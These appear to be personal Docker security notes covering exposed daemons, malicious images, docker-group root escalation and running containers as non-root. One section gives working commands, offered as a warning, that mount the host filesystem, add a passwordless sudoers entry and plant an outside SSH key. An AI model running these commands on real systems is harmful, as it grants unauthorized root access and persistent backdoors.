Docker Security Notes
=====================

* [Overview](README.md) | [Install/Config](config.md) | [Image Build](image.md)
  | [Security](security.md) | [Tips](tips.md)

Secure Your Server and Be Careful of Malicious Images
-----------------------------------------------------

There are automated bots that scan for Docker daemons to exploit; if
you leave a port open you will get 0wned. (See 'Leveraging Docker for
Root Access' below.) The default standalone config uses only a Unix
socket, but management systems may open stuff further.

Malicious images are also a problem, and, despite Docker doing
security scanning, may be left up on [Docker Hub] for a year or more.

For details, see:
* [Cryptojacking invades cloud. How modern containerization trend is
  exploited by attackers][kromtech]


Leveraging Docker for Root Access
---------------------------------

On many systems the Docker daemon socket is owned by group `docker`
and group members have write access to the socket. It's tempting to
add users to this group so they need not `sudo docker`; don't do this!

Anybody with access to the Docker daemon socket can easily leverage
this for root access on the host using the technique below. Thus, if
you're giving someone this access, make it explicit and clear by
putting them in the `sudo` group instead.

    #   On the host, start a Docker container with a root shell
    #   that has access to all files on the host.
    docker run -it --rm --name root -v /:/host:rw alpine /bin/sh -l

    #   You are now running as root user in the docker container.
    #   Allow user `taro` to sudo to a root shell with no password.
    cd /host/etc/sudoers.d
    echo 'taro ALL=(ALL) NOPASSWD:ALL' > 50-taro
    chmod 600 50-taro
    exit

    #   Or, more subtly, if another user has sudo without password:
    cat >> /host/home/adminuser/.ssh/authorized_keys
    ssh-rsa AAAA.... ur@hacked.com
    ^D

The same of course applies to making the Docker daemon socket available
to any account (root or not) inside a container.

Also see [lvh blog] for more details and a video.

User/UID in Container
---------------------

By default Docker container processes are started as UID 0 (user
`root`), relying on the container protection to isolate the process.
It's considered better practice (though not so often done, except by
some hosting services that enforce this) to run as a different user in
the container. (This can be set with `USER` in the `Dockerfile` or
`docker run -u`.) An alternative is to use user namespaces to map
`root` in the container to a different user on the host.

When using `USER` in a `Dockerfile`, note that this affects the build
of images using that image as a base image. Generally they'll have to
user another `USER` to change back to root to install further packages
or whatever, and then change back again later. Also note that hosting
services may override the `USER` with their own `docker run -u` option,
particularly if you give a username instead of UID.

When using a different user in the container, the main problem that
usually crops up is lack of an `/etc/passwd` entry for the user.
(OpenSSH, for example, will refuse to run in this circumstance.)
[`nss_wrapper`] can be used to work around this, if you install it in
your container and use appropriate wrapper scripts or similar to
supply the following environment. You must supply both passwd and
group; it won't work with just passwd.

    LD_PRELOAD=/usr/lib/libnss_wrapper.so
    NSS_WRAPPER_PASSWD=/path/to/custom/passwd
    NSS_WRAPPER_GROUP=/path/to/custom/group

This series of posts by Graham Dumpleton is a detailed exploration of
root and non-root users in Docker containers.
* [Running IPython as a Docker container under OpenShift.][dscpl151218]  
  Why is the `jupyter/notebooks` image breaking when run on OpenShift?
  Because OpenShift doesn't run it as root.
* [Don't run as root inside of Docker containers.][dscpl151218a]  
  Example of leveraging root in a container to get root access on the host.
* [Overriding the user Docker containers run as.][dscpl151222]  
  `USER` directive in Dockerfile; `run -u` option.
* [Random user IDs when running Docker containers.][dscpl151223]  
  How to handle not knowing the UID of your container.
  Working when GID is 0 and umask settings.
* [Unknown user when running Docker container.][dscpl151224]  
  Using `nss_wrapper`.
* [Issues with running as PID 1 in a Docker container.][dscpl151229]



[Docker Hub]: https://hub.docker.com/explore/
[`nss_wrapper`]: https://cwrap.org/nss_wrapper.html
[dscpl151218]: http://blog.dscpl.com.au/2015/12/running-ipython-as-docker-container.html
[dscpl151218a]: http://blog.dscpl.com.au/2015/12/don-run-as-root-inside-of-docker.html
[dscpl151222]: http://blog.dscpl.com.au/2015/12/overriding-user-docker-containers-run-as.html
[dscpl151223]: http://blog.dscpl.com.au/2015/12/random-user-ids-when-running-docker.html
[dscpl151224]: http://blog.dscpl.com.au/2015/12/unknown-user-when-running-docker.html
[dscpl151229]: http://blog.dscpl.com.au/2015/12/issues-with-running-as-pid-1-in-docker.html
[kromtech]: https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers
[lvh blog]: https://www.lvh.io/posts/dont-expose-the-docker-socket-not-even-to-a-container.html
